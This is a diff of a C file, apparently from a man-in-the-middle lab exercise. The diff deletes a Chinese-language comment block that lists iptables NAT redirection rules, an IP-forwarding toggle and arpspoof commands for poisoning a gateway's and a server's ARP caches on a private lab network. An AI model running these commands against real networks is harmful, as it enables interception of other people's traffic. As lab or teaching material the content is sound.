@@ -1,35 +1,3 @@
-/*
-* @Author: Sun
-* @Date:   2020-06-29 14:46:55
-* @Last Modified by:   Sun
-* @Last Modified time: 2020-07-08 20:38:47
-*/
-
-// ----------------------------终端相关命令----------------------------------------
-// 修改中间人到客户端的源IP为服务器IP
-// iptables -t nat -A POSTROUTING -p tcp -s [mid_ip] -d [client_ip] -j SNAT --to-source [server_ip]
-// mine: iptables -t nat -A POSTROUTING -p tcp -s 192.168.40.138 -d 192.168.40.139 -j SNAT --to-source 192.168.40.128
-//
-// 修改客户端到服务器的目的IP为中间人IP
-// iptables -t nat -A PREROUTING -p tcp -s [client_ip] -d [server_ip] -j DNAT --to [mid_ip]
-// mine: iptables -t nat -A PREROUTING -p tcp -s 192.168.40.139 -d 192.168.40.128 -j DNAT --to 192.168.40.138
-//
-// 开启本机的IP转发功能
-// 不开启的话攻击之后会使目标机断网而不是欺骗
-// 开启: echo 1 >/proc/sys/net/ipv4/ip_forward
-// 关闭: echo 0 >/proc/sys/net/ipv4/ip_forward
-//
-// arp欺骗
-// 让目标的流量经过主机的网卡再从网关出去
-// 网关也会把原本流入目标机的流量经过主机
-// 1.欺骗网关
-// arpspoof -i [mid_nic_name] -t [client_ip] [gateway_ip]
-// mine: arpspoof -i eth0 -t 192.168.40.139 192.168.40.2
-// 2.欺骗服务器
-// arpspoof -i [mid_nic_name] -t [client_ip] [server_ip]
-// mine: arpspoof -i eth0 -t 192.168.40.139 192.168.40.128
-// -------------------------------------------------------------------------------
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -349,7 +317,6 @@ int send_message(m_arg *arg)
     unsigned char tag[16] = {0};
     printf("\n");
     strcpy(plain_text, arg->buffer);
-    // fgets(plain_text, 255, stdin);
     if (strcmp(plain_text, "quit") == 0)
     {
         return 1;
